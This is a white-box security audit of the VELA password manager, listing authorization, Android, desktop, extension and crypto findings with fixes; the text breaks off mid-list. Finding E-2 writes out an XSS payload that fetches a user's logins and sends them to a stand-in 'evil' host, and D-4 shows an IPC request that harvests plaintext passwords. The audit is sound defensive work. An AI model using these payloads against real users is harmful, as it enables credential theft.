# VELA — White-Box Security Audit

| | |
|---|---|
| **Date** | 2026-08-02 |
| **Scope** | `serverVELA`, `libVELA`, `desktopVELA` (Tauri/gpui-ce), `extension` (browser extension + native messaging), `androidVELA` |
| **Method** | Static source review (all 5 components) + dynamic testing against an isolated local server |
| **Commit audited** | `912c7d5` (HEAD) |
| **Classification** | White-box, authorized research on the owner's own codebase |

---

## Executive summary

VELA's cryptographic core is sound: hybrid ML-DSA-87 + Ed25519 signatures, PASETO v4 public
(no algorithm confusion), XChaCha20-Poly1305 with fresh 192-bit nonces, replay-protected
single-use challenges, parameterized SQL (no injection), and strong baseline hardening on the
server (security headers on every response, body-size caps, proxy-header anti-spoofing scoped to
CIDRs, 0600 key files). No known-vulnerable dependency versions were found.

The most material problems are **authorization-model** weaknesses, not crypto breaks:

1. The **web-session grant** flow trusts "any authenticated user who saw the QR" — and the `rw`
   mode hands the **non-rotating Root Master Seed (RMS)** to the browser. This is the single
   highest-impact weakness. *(Since fixed — S-1/S-4: the browser commits the account it wants at
   `start` and only that account may fetch the session keys or grant it; S-2: polling requires a
   secret the browser registered and the QR never carries; D-2: `rw` seals per-chunk vault keys
   instead of the RMS.)*
2. The **Android launcher activity** returns plaintext credentials to any caller that
   `startActivityForResult`s it, with no caller validation.
3. The **desktop app's auto-lock is lazy** — secrets stay in memory past the expiry deadline
   until the next user action.

Several medium-severity issues round out the picture (credential-bypass paths in the extension,
unauthenticated endpoints on the server, per-user recovery DoS, biometric gaps on macOS).

**No production systems were touched.** Dynamic testing ran against a throwaway server instance
with an isolated `DATA_DIR` on loopback, then was torn down.

---

## Methodology

1. **Static review** — every source file in scope was read; patterns were cross-checked with
   ripgrep. Findings cite `file:line` and quote the offending code.
2. **Dynamic testing** — the sync server was built from source and run with
   `DATA_DIR=/tmp/... LISTEN_ADDR=127.0.0.1:8553` (cleartext dev mode; `enforce_https` only
   gates production). Findings marked **[DYN-VERIFIED]** were reproduced with live HTTP requests.
3. **Dependency review** — `Cargo.lock` versions cross-checked against known advisories.

Findings flagged **[DYN-VERIFIED]** were reproduced live; the rest are confirmed by direct code
reading.

---

## Test environment (isolated)

```bash
# Throwaway instance — no production data involved
DATA_DIR=/tmp/opencode/vela-test-data \
LISTEN_ADDR=127.0.0.1:8553 \
RUST_LOG=warn \
./serverVELA/target/debug/vela-server
```

Torn down after testing (`pkill` + `rm -rf /tmp/opencode/vela-test-data`).

---

## Findings summary

| # | Severity | Component | Title | Verified | Status |
|---|---|---|---|---|---|
| S-1 | **High** | server + desktop | Web-session grant trusts "any user who saw the QR"; `rw` leaks the RMS | code + dynamic | **FIXED** (grant bound to the approver; RMS export = D-2, also fixed) |
| S-2 | High | server | `GET /web-session/:id` fully unauthenticated; one-shot capsule DoS | **[DYN-VERIFIED]** | **FIXED** (poll requires the browser's secret) |
| S-3 | Medium | server | Recovery-initiation per-user DoS (rate limit keyed on `user_id` only) | **[DYN-VERIFIED]** | **FIXED** (per-victim cap keyed on the source too) |
| S-4 | Medium | server | `/web-session/:id/keys` not ownership-scoped (enabler for S-1) | code | **FIXED** (scoped to the committed approver) |
| A-1 | **High** | android | Exported `MainActivity` leaks plaintext creds to any caller | code | **FIXED** (one-time token proves the intent is ours) |
| A-2 | Medium | android | `com.<x>` package name auto-maps to `<x>.com` (autofill phishing) | code | open |
| A-3 | Medium | android | Release silently debug-signed when keystore missing | code | open |
| D-1 | **High** | desktop | Auto-lock is lazy — secrets persist in RAM past expiry | code | **FIXED** (watchdog thread locks on the deadline) |
| D-2 | High | desktop | `rw` web-session grants the non-rotating RMS to the browser | code | **FIXED** (per-chunk vault keys instead of the RMS) |
| D-3 | High | desktop | macOS "biometric" = Keychain read, no user-presence proof | code | **FIXED** (LocalAuthentication evaluation + ACL) |
| D-5 | **High** | desktop | **Windows "Hello" was never invoked** — credential read only (found while fixing D-3) | code | **FIXED** (UserConsentVerifier gates every read) |
| D-4 | Medium | desktop | IPC returns plaintext passwords to any same-uid caller | code | open |
| E-1 | Medium | extension | `nativeMessage` / `getNativeMessage` bypass credential auth | code | open |
| E-2 | Medium | extension | Popup XSS via unescaped `login.id` in attributes | code | open |
| C-1 | High | crypto (JNI) | Private keys / RMS cross FFI as immutable base64 `String`s | code | **PARTIAL** (RMS crosses as bytes; identity keys still strings) |
| C-2 | Medium | crypto | No AAD/version binding on AEAD → silent rollback by server | code | open |
| C-3 | Medium | crypto | Shamir recovery shares unauthenticated (tamper → wrong RMS) | code | open |
| C-4 | Medium | crypto | `VelaByteBuffer` capacity UB across FFI | code | open |

(Lower-severity / hardening items are listed in the final section.)

---

## Detailed findings

### S-1 — Web-session grant trusts "any authenticated user who saw the QR"  ·  **HIGH** (server + desktop)

> **STATUS: FIXED.** The browser now commits the account it wants access to
> (`approver_user_id`) in `POST /web-session/start`, before the QR exists, and the
> server admits only that account at `/web-session/:id/keys` (404 otherwise) and
> `/web-session/:id/grant` (403 otherwise) — the identity check is re-asserted in
> the `UPDATE ... WHERE approver_user_id = $7` so a concurrent grant can't slip
> past it. The approver apps additionally require the full
> `{id}#{fingerprint}#{link_nonce}` code, so the key-substitution check can no
> longer be skipped by presenting a legacy short code. Regression:
> `security/exploits/test_s1_grant_hijack.py` (hard CI gate) and
> `web_session_is_bound_to_the_committed_approver` in the server integration
> tests. The `rw` raw-RMS export was the other half of this finding and is fixed
> under D-2.

**Locations**
- `serverVELA/vela-server/src/web_session/mod.rs:336-413` (`post_grant`)
- `serverVELA/vela-server/src/web_session/mod.rs:269-311` (`get_keys`)
- `desktopVELA/src-tauri/src/commands/web_session.rs:145-179` (RMS envelope)

**Description.** `POST /web-session/:id/grant` authorizes a pending browser session using the
bearer token of **whoever calls it**. The handler writes the caller's own `user_id` into the
session (`UPDATE web_sessions SET user_id = $1 ... WHERE id = $6 AND status = 'pending'`,
`web_session/mod.rs:394-408`). The only anti-phishing binding is `link_nonce`, but that nonce is
encoded in **the same QR** as `session_id` — it is the sole channel by which the legitimate
approver echoes it back, so anyone who observes the QR has both values. There is **no check that
the caller is the approver the browser intended.**

`GET /web-session/:id/keys` (S-4) supplies the enabling primitive: it requires *a* valid token
but its lookup is keyed only on `id` (`web_session/mod.rs:276-281`) — any authenticated user can
fetch the browser's `ephemeral_pk`, craft a malicious capsule sealed to it, and submit the grant.

The desktop client's `rw` envelope (`desktopVELA/src-tauri/src/commands/web_session.rs:152-156`)
puts the raw RMS into the capsule:

```rust
"rw" => serde_json::json!({ "v": 1, "mode": "rw", "rms_b64": B64.encode(crypto.rms()) })
```

The RMS is the root of every derived key (vault, audit, share, identity, MAC, ORAM) and **never
rotates** for the lifetime of the vault.

**Exploitation.** An attacker with their own VELA account who observes the victim's QR
(shoulder-surf, screen-share, referrer/URL leak, XSS in the SPA) within the 5-minute pending TTL:
1. `GET /web-session/:id/keys` — returns the victim browser's `ephemeral_pk`.
2. Seal a capsule (attacker-chosen RMS in `rw`, or a fake RO snapshot) to that key.
3. `POST /web-session/:id/grant` with the attacker's own bearer token + observed `link_nonce`.
   First grant wins (atomic `WHERE status = 'pending'`).
4. Victim browser polls `GET /web-session/:id`, decrypts the attacker capsule, and trusts the
   attacker-controlled vault state — or, in `rw`, adopts an attacker-controlled RMS forever.

**Impact.** Full vault compromise; in `rw` mode, permanent (past + future, all devices).

**Defenses present (why this isn't Critical):** constant-time nonce compare
(`web_session/mod.rs:379`), single-grant atomicity, approver must be authenticated, 5-min TTL,
rate limits (30 starts/h/IP, 60 key-fetches/min/user). None bind the grant to the intended
approver.

**Recommendation.** Bind the session to the intended approver at `start` time (e.g. the browser
commits the approver's `user_id`, signed by its ephemeral key, into the QR/server record), and
require the grantor to be that user; or require the grantor to re-assert the browser's
`ephemeral_pk` under the approver's device signature. Additionally, drop the raw-RMS export in
`rw` in favour of a session-scoped derived key, and make the QR-fingerprint check unconditional
(legacy bare-UUID forms currently skip it, `commands/web_session.rs:65-86`).

---

### S-2 — `GET /web-session/:id` is fully unauthenticated  ·  **HIGH**  ·  **[DYN-VERIFIED]**

> **STATUS: FIXED.** The browser now registers `poll_secret_hash` (SHA-256 of a
> 32-byte secret) at `start` and must present the secret in
> `X-Web-Session-Secret` to poll. The secret never travels in the QR, so knowing
> a `session_id` no longer lets anyone collect — and thereby destroy — the
> one-shot capsule. A missing session and a wrong secret both return the same
> 401, so the endpoint is no longer an existence oracle either. The endpoint
> stays account-unauthenticated by design: the browser has no account, and
> possession of the secret is what stands in for identity. Regression:
> `web_session_poll_requires_the_browsers_secret` plus the S-2 leg of
> `security/exploits/test_s1_grant_hijack.py`.

**Location.** `serverVELA/vela-server/src/web_session/mod.rs:208-251` (`get_session`)

**Description.** The polling handler has **no `AuthSession`** extractor and no ownership check —
only a per-IP rate limit (`web_session_poll_by_ip`, 120/min/IP). It returns the granted capsule
exactly once and then NULLs it server-side (`UPDATE web_sessions SET capsule = NULL`,
`:239-242`).

**Dynamic proof.**
```
$ curl -s -o /dev/null -w "%{http_code}" \
    http://127.0.0.1:8553/web-session/00000000-0000-0000-0000-000000000000
404          # <- 404, not 401: the endpoint requires no auth at all
```

**Exploitation.** Anyone who learns the 122-bit `session_id` (path-segment leak in URLs, logs,
referrers) can race the legitimate browser for the one-shot capsule. The capsule is KEM-sealed
(theft alone is useless), but **winning the race deletes the capsule** → reliable denial-of-service
of web vault access.

**Severity note.** Downgraded from Critical because UUIDv4 `session_id` enumeration is infeasible
online (120/min/IP) and the stolen capsule is unreadable without the browser's ephemeral private
key. The residual impact is reliable DoS once an id leaks.

**Recommendation.** Require the browser's proof of possession (e.g. a short-lived bearer derived
from its ephemeral key) before delivering/invalidating the capsule.

---

### S-3 — Recovery-initiation per-user DoS  ·  **MEDIUM**  ·  **[DYN-VERIFIED]**

> **STATUS: FIXED.** The per-victim cap is now keyed on `(ip, user_id)` at
> 5/hour (`rate_limit::recovery_initiate_by_ip_user`), so a third party can only
> ever throttle itself — the same reasoning the `/auth/verify` failure counters
> already used. A per-user backstop remains for distributed churn but at 50/hour,
> which one legitimate user cannot reach. Regression:
> `recovery_initiate_limit_cannot_be_burned_for_someone_else`.

**Location.** `serverVELA/vela-server/src/recovery/initiate.rs:44-53`

```rust
rate_limit::recovery_initiate_by_ip(&state.store, &ip)?;            // per-IP
rate_limit::check(&state.store,
    &format!("rl:recover:init:user:{}", body.user_id), 5, 3600)?;   // per-user, no IP
```

**Description.** The per-user cap (5/hour) is keyed only on `user_id`, not on IP. The comment at
`:46-47` notes it is *intended* to stop a distributed attacker churning recovery state from many
IPs — but it is exactly this property that lets a single attacker burn a victim's 5/hour budget
from any IP, blocking the victim's legitimate recovery initiation for an hour. The endpoint is
unauthenticated by design (pre-auth recovery).

**Dynamic proof.**
```
$ for i in 1 2 3 4 5 6; do
    curl -s -o /dev/null -w "call $i -> %{http_code}\n" -X POST \
      http://127.0.0.1:8553/recovery/initiate -H 'Content-Type: application/json' \
      -d '{"user_id":"aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"}'
  done
call 1 -> 404
call 2 -> 404
call 3 -> 404
call 4 -> 404
call 5 -> 404
call 6 -> 429          # <- victim now locked out of recovery for 1h
```

**Recommendation.** Make the per-IP cap primary and the per-user cap secondary/longer, or add a
per-IP limit that cannot be exceeded even when the per-user budget is being burned by a third
party.

---

### S-4 — `/web-session/:id/keys` not ownership-scoped  ·  **MEDIUM** (enabler for S-1)

> **STATUS: FIXED.** The lookup is now
> `WHERE id = $1 AND approver_user_id = $2`; any other caller gets the same 404 as
> a nonexistent session.

**Location.** `serverVELA/vela-server/src/web_session/mod.rs:269-311`

**Description.** Any authenticated user can read `ephemeral_pk`/`web_vk` for **any** pending
`session_id` they can name — the lookup is `WHERE id = $1` with no `user_id` predicate. The keys
are public by design (KEM/signing halves), but this is the enabling primitive for S-1: an
attacker who only saw `session_id` (e.g. from a URL, not the QR) gets exactly what they need to
craft a malicious grant capsule.

**Recommendation.** Require proof the caller is the intended approver before releasing keys.

---

### A-1 — Exported `MainActivity` leaks plaintext credentials via Autofill-unlock IPC  ·  **HIGH**

> **STATUS: FIXED.** `VelaAutofillService` mints a one-time token
> (`AutofillUnlockTokens`) into the `PendingIntent` it builds, and
> `parseAutofillRequest` ignores any unlock intent that cannot redeem one. An app
> that crafts its own intent has no token, so it never reaches the
> `FillResponse`. Caller identity is deliberately not the check: the Autofill
> framework launches the PendingIntent from the *filled app's* process, so
> `getCallingPackage()` is attacker-influenced. Tokens are in-memory, one-shot,
> and expire in 5 minutes; a process restart fails closed to a plain unlock.

**Locations**
- `androidVELA/app/src/main/AndroidManifest.xml:22` (`android:exported="true"` — required as launcher)
- `androidVELA/app/src/main/java/com/vela/android/MainActivity.kt:272-282` (`parseAutofillRequest`)
- `androidVELA/.../MainActivity.kt:256-269` (returns `FillResponse` to caller)

**Description.** `MainActivity` is the launcher (hence exported) but also doubles as the
post-unlock Autofill callback. The unlock intent is parsed with **no caller validation** —
`getCallingPackage()` / `getCallingActivity()` is never checked, and there is no signature
enforcement:

```kotlin
private fun parseAutofillRequest(intent: Intent?): AutofillFillRequest? {
    if (intent == null || !intent.getBooleanExtra(EXTRA_AUTOFILL_UNLOCK, false)) return null
    ...
    domain = intent.getStringExtra(EXTRA_AUTOFILL_DOMAIN),     // attacker-controlled
    packageName = intent.getStringExtra(EXTRA_AUTOFILL_PACKAGE)
}
```

…and the result is returned to whoever invoked the activity (`setResult(RESULT_OK, result)` at
`:265`). The intended caller is the Autofill framework (via `PendingIntent`), but nothing
restricts the caller to it.

**Exploitation.** A malicious app does `startActivityForResult` on `MainActivity` with
`EXTRA_AUTOFILL_UNLOCK=true`, `EXTRA_AUTOFILL_DOMAIN="bank.com"`, and attacker-supplied
`AutofillId`s. The user sees the normal VELA unlock screen (phishable under multi-window). After
unlock, `onVaultUnlocked() → tryCompleteAutofillUnlock()` returns a `FillResponse` of plaintext
`bank.com` credentials to the attacker.

**Recommendation.** Verify the caller is the Autofill framework (when started via `PendingIntent`,
`getCallingPackage()` is `null`/`"android"`), or sign the internal intent with a signature-level
permission.

---

### A-2 — Autofill phishing via `domainFromPackageName` heuristic  ·  **MEDIUM**

**Location.** `androidVELA/app/src/main/java/com/vela/android/core/LocalVaultRepository.kt:153-186`

**Description.** A package `com.<target>` auto-maps to `<target>.com`:

```kotlin
val parts = pkg.split(".")
if (parts.size >= 3 && parts[0] == "com") return "${parts[1]}.com"
```

**Exploitation.** An attacker publishes an app named `com.bank`; when the user autofills in it,
VELA returns the user's real `bank.com` credentials. Combined with `domainsMatch` suffix logic
(`:142-151`) this is cross-app credential exfiltration.

**Recommendation.** Do not derive web domains from package names. Require an explicit
verified-asset association (`<digitalassetlinks>` / `asset_statements`) before matching an app to
a stored web login.

---

### A-3 — Release builds silently signed with the debug key when keystore is missing  ·  **MEDIUM**

**Location.** `androidVELA/app/build.gradle.kts:49-54`

```kotlin
release {
    signingConfig = signingConfigs.findByName("release")
        ?: signingConfigs.getByName("debug")
}
```

**Impact.** CI/contributor `assembleRelease` without `VELA_KEYSTORE_FILE` produces an APK signed
with the well-known public debug key — defeating signature-pinning and enabling
same-key replacement in sideload/downgrade scenarios.

**Recommendation.** Fail the release build when no keystore is configured.

---

### D-1 — Auto-lock is lazy: secrets persist in memory past expiry  ·  **HIGH**

> **STATUS: FIXED.** `commands::session::spawn_auto_lock_watchdog` runs
> `auto_lock_if_expired` on its own thread every 15 s, so the deadline is enforced
> by the clock rather than by the next command. Both frontends start it: Tauri
> emits `session-locked` (the same event the manual lock uses, so the renderer
> clears the clipboard and in-memory items), gpui sends `TrayCommand::Locked`
> (same path as "Lock Now"). Regression:
> `auto_lock_wipes_secrets_once_the_deadline_passes`.

**Locations**
- `desktopVELA/vela-desktop-core/src/session.rs:66-72` (`is_expired` only compares timestamps)
- `desktopVELA/vela-desktop-core/src/lib.rs:131-134` (`is_unlocked` never wipes state)
- `desktopVELA/src-tauri/src/main.rs` (no background timer — `rg auto_lock|lock_session` over
  `src-tauri/src` returns no spawn/interval)

**Description.** `Session::is_expired()` is only evaluated when a command runs. There is **no
background task** that calls `lock_session()` on expiry. The in-memory RMS
(`biometric.rs:5 CACHED_RMS`), the live `Crypto` context, the decrypted `VaultStore`, and the
last clipboard secret (`commands::clipboard::LAST_WRITTEN`) therefore remain in plaintext RAM
until the next user action — even if `auto_lock_minutes` elapsed long ago with the app idle.

**Exploitation.** User unlocks and walks away with the app running hidden; an attacker with local
code-exec under the same uid dumps process memory (`gcore`, hibernation file, swap, crash dump)
and recovers the cleartext vault.

**Recommendation.** Spawn a tokio task in `main.rs::setup` that polls `is_expired()` every
15-60s and calls `lock_session()` + emits `session-locked`, wiping `CACHED_RMS` and clipboard.

---

### D-2 — `rw` web-session grants the non-rotating RMS to the browser  ·  **HIGH**

> **STATUS: FIXED.** An `rw` grant now seals a **v2 envelope carrying per-chunk
> vault keys** (`kdf::web_session_chunk_keys`, `vault-main` + `vault` + the first
> 32 `vault-data-NNNNNN` chunks) instead of `rms_b64`. What a leaked capsule
> yields is bounded to those chunks' contents: no identity, share, audit, MAC,
> ORAM or recovery key derives from it, and no chunk outside the granted window.
> The WASM bridge takes a `chunk_key_b64` and no longer has an RMS decode path at
> all, and the web client refuses a v1 (`rms_b64`) grant from an outdated app.
> The fingerprint check is now unconditional in every approver (desktop, gpui,
> Android, iOS) — codes missing the fingerprint or link nonce are rejected, not
> downgraded.
>
> **Residual risk:** the granted chunk keys are still long-lived vault keys, not
> per-session ones — revocation stops server access but does not re-key what a
> browser already copied. True containment still needs vault re-keying (§9,
> out of scope for v1).

**Location.** `desktopVELA/src-tauri/src/commands/web_session.rs:145-179`

```rust
"rw" => serde_json::json!({ "v": 1, "mode": "rw", "rms_b64": B64.encode(crypto.rms()) })
```

**Description.** The full 32-byte RMS is sealed to the browser's ephemeral KEM key and POSTed to
`/web-session/:id/grant`. The RMS derives every key (vault, audit, share, identity, MAC, ORAM)
and never rotates. Recovery of this single value = permanent full-vault compromise, including
items added afterwards. (Pairs with S-1: a malicious server or attacker-controlled approver who
obtains the RW capsule gets the RMS forever.)

Additionally, the fingerprint-substitution check (`web_session.rs:129-137`) only fires when the
QR embeds a fingerprint; legacy bare-UUID / `{"session_id":...}` JSON forms (`parse_session_id`,
`:65-86`) set `expected_fp = None` and **skip substitution detection** — a malicious server can
swap the browser's KEM pubkey for its own and silently receive the RMS.

**Recommendation.** Prefer a session-scoped derived key over exporting the RMS; if `rw` RMS
export is kept, make the fingerprint-substitution check unconditional (reject bare-UUID QRs).

---

### D-3 — macOS "biometric" unlock is a Keychain read with no user-presence proof  ·  **HIGH**

> **STATUS: FIXED — real biometric authentication, not an implicit ACL.**
> `macos_biometric::authenticate()` asks **LocalAuthentication** to verify the
> device owner (`LAContext.evaluatePolicy`,
> `DeviceOwnerAuthenticationWithBiometrics`) *before* any key is read, and then
> hands that **same evaluated context** to the Keychain read via
> `kSecUseAuthenticationContext` — so the user sees exactly one prompt and macOS
> still enforces the item's `kSecAccessControlUserPresence` ACL underneath. Two
> independent gates: the app authenticates the user, and the OS refuses the item
> to anything that has not.
>
> The factor is whatever the hardware has — Touch ID, Face ID or Optic ID — since
> the policy means "this device's biometry"; `LAContext.biometryType` is used to
> name it correctly in prompts, errors and the reported provider
> (`BiometricProvider::{TouchId, FaceId, OpticId}`). On a Mac with no sensor, a
> paired Apple Watch (`…WithBiometricsOrWatch`) is accepted as the presence
> factor; with neither, biometric unlock fails closed to the master password,
> exactly as Linux does.
>
> Pre-ACL items live under a separate account name: biometric unlock refuses them
> rather than reading them, and one master-password unlock migrates the key
> (`biometric::migrate_unprotected_stored_rms`) and deletes the unprotected copy.
> Key-presence probes use an attribute-only query so they never trigger a prompt.
>
> **Verification caveat:** `cfg(target_os = "macos")` code cannot run in the
> Linux dev/CI environment. It is type-checked against the real
> `objc2-local-authentication` / `security-framework` crates for
> `x86_64-apple-darwin`; the prompt itself, the single-prompt behaviour and the
> pre-ACL migration need one manual pass on hardware.

**Locations**
- `desktopVELA/vela-desktop-core/src/biometric.rs:647-692` (macOS `authenticate_inner`)
- `desktopVELA/vela-desktop-core/src/device.rs:373-432` (`retrieve_from_secure_enclave` → `get_generic_password`)
- `desktopVELA/src-tauri/src/commands/biometric.rs:9-13` (`authenticate()` exposed to renderer)

**Description.** On macOS, `authenticate_inner` reads the RMS from the Keychain and returns
`success: true`. No `kSecAttrTokenIDTouchIDCurrent` / `kSecAccessControlUserPresence` ACL is set
on the item; it is gated only by the default Keychain ACL (login password / iCloud Keychain
sync). The code's own comment concedes this ("macOS has no Touch ID integration yet…"). Contrast
Linux (`biometric.rs:391-438`) which correctly requires `fprint::verify()` first.

**Exploitation.** `authenticate()` is exposed to the renderer with no extra checks. Any renderer
compromise (XSS, malicious extension, debugger) calls `authenticate()` → populates `CACHED_RMS`
→ reads vault.

**Recommendation.** On macOS, set a `SecAccessControl` with `.userPresence`/Touch ID, or omit
macOS from `authenticate()` until Touch ID is wired up (mirror the Linux storage-vs-verification
split). Also fix `enroll()` (`commands/biometric.rs:42-48`) which unconditionally returns
`WindowsHello` regardless of platform.

---

### D-5 — Windows "biometric" unlock never invoked Windows Hello  ·  **HIGH** (found during remediation)

> **STATUS: FIXED.** `windows_biometric::authenticate()` now calls
> `UserConsentVerifier` (through `IUserConsentVerifierInterop::RequestVerificationForWindowAsync`,
> which is what a non-packaged desktop app needs so the prompt parents to its own
> window, falling back to the plain WinRT call) and **returns before reading any
> key** unless the user verified. `check_availability` reports `WindowsHello` only
> when Hello can actually verify the user, and `MasterPassword` otherwise.

**Locations**
- `desktopVELA/vela-desktop-core/src/biometric.rs` (`windows_biometric::authenticate`)
- `desktopVELA/vela-desktop-core/src/device.rs` (`tpm::retrieve_from_tpm`, Credential Manager read)

**Description.** This was not in the original findings — the audit contrasted the
macOS gap (D-3) against "Linux, which correctly requires `fprint::verify()`", and
did not check that the Windows path did the same. It did not. `authenticate()`
read the TPM-sealed key, or `CredReadW`'d the `VELA_RMS` credential, and returned
`success: true`. Both reads are granted to *anything running in the user's
session*: no Hello prompt, no PIN, no user presence of any kind. The provider was
nevertheless reported as `WindowsHello`, so the UI told users their vault was
protected by a biometric that was never consulted — the same defect as D-3, with
the same impact (any renderer compromise calling `authenticate()` unlocks the
vault), on the platform the audit assumed was fine.

**Impact.** Identical to D-3: full vault access for local code running as the
user, with no user interaction.

---

### D-4 — IPC returns plaintext passwords to any same-uid caller  ·  **MEDIUM**

**Location.** `desktopVELA/vela-desktop-core/src/ipc.rs:294-312`

**Description.** The `user_initiated` autofill path returns full plaintext credentials
(serialized verbatim, incl. `password`, confirmed by the test at `:760-768`) gated **only** by
the per-process capability token. Biometric gating is deferred to the browser extension ("the
extension will gate on biometric itself", `:759`). The token is a plaintext bearer stored at
`store_path/ipc_auth.json` (0600) — readable by any process under the same uid.

**Exploitation.** Any local script/malware running as the user reads `ipc_auth.json`, connects
to `vela-desktop-<pid>-<rand>.sock`, sends
`{"msg_type":"autofill_request","payload":{"domain":"<victim>","user_initiated":true},"capability":"<token>"}`
and harvests plaintext passwords.

**Recommendation.** Enforce biometric in the desktop before returning plaintext over IPC
regardless of `user_initiated`; document the same-uid threat model explicitly.

---

### E-1 — `nativeMessage` / `getNativeMessage` bypass credential authorization  ·  **MEDIUM**

**Locations**
- `extension/src/background/background.js:202-204, 438-445` (`nativeMessage`)
- `extension/src/background/background.js:581-597` (`getNativeMessage` port handler)

**Description.** Unlike `getLogins`/`getAvailableLogins`/`saveCredentials` (all gated on
`authorizeCredentialRequest()` at `:272,313,489`), the `nativeMessage` command forwards
arbitrary `data` straight to `sendNativeMessage()` with **no authorization**. The
`getNativeMessage` port handler accepts any message from any content script
(`runtime.connect({name:"injected-script"})`) with no `sender.tab`/`frameId` validation.

**Exploitation.** A content script in a cross-origin iframe (frameId ≠ 0, which
`authorizeCredentialRequest` would reject) connects to the port and requests passwords for any
domain: `{command:"getNativeMessage", action:"getLogins", url:"<victim>", userInitiated:true}`.

**Recommendation.** Remove these two escape hatches, or route them through the same
`authorizeCredentialRequest()` gate used by `getLogins`.

---

### E-2 — Popup XSS via unescaped `login.id` in attributes  ·  **MEDIUM**

**Location.** `extension/src/popup/popup.js:162,169,174,179`

```js
<li class="login-item" data-login-id="${login.id || ""}">
```

**Description.** Unlike `name`/`domain` (escaped at `:165-166`), `login.id` is interpolated raw
into `data-login-id="..."`. The popup runs in the extension's privileged origin with full access
to `browser.runtime`, `browser.tabs`, `nativeMessaging`.

**Exploitation.** A vault entry whose `id` is
`x" onclick="browser.runtime.sendNativeMessage('com.vela.desktop',{action:'getLogins',url:'evil.com',userInitiated:true}).then(r=>fetch('//evil/?d='+btoa(JSON.stringify(r))))`
would, on click of any login row, exfiltrate every credential. The `id` is normally a UUID, but a
corrupted/synced/imported entry suffices. (Companion issue: `velaEscapeHtml`
`content-script.js:1650-1654` doesn't escape `"`/`'`, unsafe in attribute contexts at `:1113,1178,1316,1320,1325`.)

**Recommendation.** Pass `login.id` through `escapeHtml`; make the escaper also escape `"`/`'`.

---

### C-1 — Private keys / RMS cross the JNI/FFI boundary as immutable base64 `String`s  ·  **HIGH**

> **STATUS: PARTIALLY FIXED — the RMS no longer crosses as a string.** Every JNI
> entry point that consumes the RMS (vault and per-chunk encrypt/decrypt, web
> session chunk keys, Shamir split) now takes it as a `ByteArray`, and the Rust
> copy is wiped on drop (`SecretBytes`). The paths that *return* a recovered RMS
> (RMS capsule decrypt, Shamir combine) write into a caller-provided `ByteArray`
> instead of returning base64 in the JSON. Kotlin callers already held the RMS as
> a `ByteArray` and wipe it with `fill(0)`, so the un-zeroizable base64 `String`
> is gone from the RMS path entirely.
>
> **Still open:** `generate_server_identity` returns the hybrid signing key and
> share decapsulation key as base64 strings, and `ServerIdentityStore` persists
> them that way. Fixing that is a storage-format change (opaque handles + a
> Rust-side keystore), tracked separately. iOS has the same string-based FFI
> shape and is tracked with it.

**Locations**
- `libVELA/vela-android-bridge/src/lib.rs:82-88, 426-429, 478-501` (key material returned as base64 strings)
- `libVELA/vela-crypto/src/signing.rs:243-273` (`into_bytes` zeroizes `this` but leaks intermediate copies)

**Description.** `generate_server_identity()` returns the ML-DSA-87 + Ed25519 **private signing
key** and the KEM decapsulation key as base64 inside JVM `String`s; every decrypt call takes
`rms_b64` the same way. JVM/Kotlin strings are immutable, may be interned, are never zeroized,
and land in heap dumps / logcat on crash. This contradicts the design claim that keys "live in
the hardware enclave or are zeroized immediately" (`signing.rs:31-32`, `kdf.rs:84-95`).

**Exploitation.** Any process that can read app memory (root, malware with `ptrace`, heap dump
in crash reporting, malicious keyboard/AccessibilityService) recovers the long-term identity key,
share decapsulation key, and RMS → full vault compromise.

**Recommendation.** Stop shipping private keys/RMS through JNI strings. Keep key material behind
opaque Rust handles and perform all crypto in Rust, returning only the result.

---

### C-2 — No AAD/version binding on AEAD ciphertexts → silent rollback  ·  **MEDIUM**

**Location.** `libVELA/vela-crypto/src/aead.rs:21-36` (no AAD parameter; all callers pass empty)

**Description.** Nothing binds a ciphertext to vault id / chunk id / item id / a monotonic
version. Per-chunk keys bind chunks to their `chunk_id`, but whole-vault blobs (and
`SHARE_ENCRYPTION`/`MAC_KEY` contexts) have no freshness or identity binding.

**Exploitation.** The sync server (honest-but-curious, by design untrusted) silently rolls a
vault blob back to an older ciphertext — deleted credentials reappear, rotated passwords revert.
The client cannot detect this cryptographically.

**Recommendation.** Add AAD (vault id + monotonic version) to whole-vault AEAD; have clients
reject any ciphertext whose version is ≤ the last-seen version.

---

### C-3 — Shamir recovery shares are unauthenticated  ·  **MEDIUM**

**Location.** `libVELA/vela-crypto/src/shamir.rs:151-188` (no integrity; test `:267-271` accepts
wrong output), consumed unchecked at `vela-android-bridge/src/lib.rs:585-599`.

**Description.** Shares have no integrity/MAC. The server holds Share 2; the cloud provider holds
Share 1. Either party can substitute share bytes. With 2-of-3, an attacker holding one legitimate
share plus control of a second share's bytes reconstructs/controls the RMS; a passive tamperer
bricks recovery (user derives a wrong RMS → permanent data loss).

**Recommendation.** MAC each share under the `SHARE_ENCRYPTION`-context key, or store a BLAKE3
fingerprint of the RMS and verify after reconstruction.

---

### C-4 — `VelaByteBuffer` reconstructs `Vec` with wrong capacity → UB  ·  **MEDIUM**

**Location.** `libVELA/vela-android-bridge/src/lib.rs:377-381, 686-693`

**Description.** `vec_to_buffer` forgets the `Vec` without recording its true capacity; the
freeing path uses `Vec::from_raw_parts(ptr, len, len)`, forcing capacity = len. Paths where
`capacity > len` (e.g. `B64::decode`) deallocate with the wrong layout → heap corruption in the
same process as all key material.

**Recommendation.** Carry the true capacity in `VelaByteBuffer` (or shrink-to-fit before
forgetting).

---

## Confirmed defenses (positive findings)

These were checked and are **correctly implemented** — listed so they are not retested and to
credit the existing hardening:

- **Crypto core:** XChaCha20-Poly1305 with fresh 192-bit random nonces per message; hybrid
  ML-KEM-1024 + X25519 KEM combiner via HKDF-SHA256; all secret generation uses `OsRng`/
  `getrandom`; ML-DSA avoided due to RUSTSEC-2025-0144; no hardcoded keys/IVs outside tests; no
  constant-time comparison bugs (no secret-bearing comparisons exist).
- **Server auth:** PASETO v4 public with type-level version binding (no algorithm confusion);
  hard-cap claim (sliding 15-min renewal ≤ 8h absolute); JTI revocation cascade; replay-protected
  single-use challenges (consumed via `get_del`); constant-time `link_nonce` compare; uniform
  `RECOVERY_UNAVAILABLE` message (anti-enumeration); single-delivery RMS capsule; per-`(ip,device)`
  backoff scoping with regression test.
- **Server transport:** proxy-header anti-spoofing (`X-Forwarded-For`/`CF-Connecting-IP` honored
  only when peer IP ∈ `TRUSTED_PROXY_CIDRS`, values re-validated as `IpAddr`); production rejects
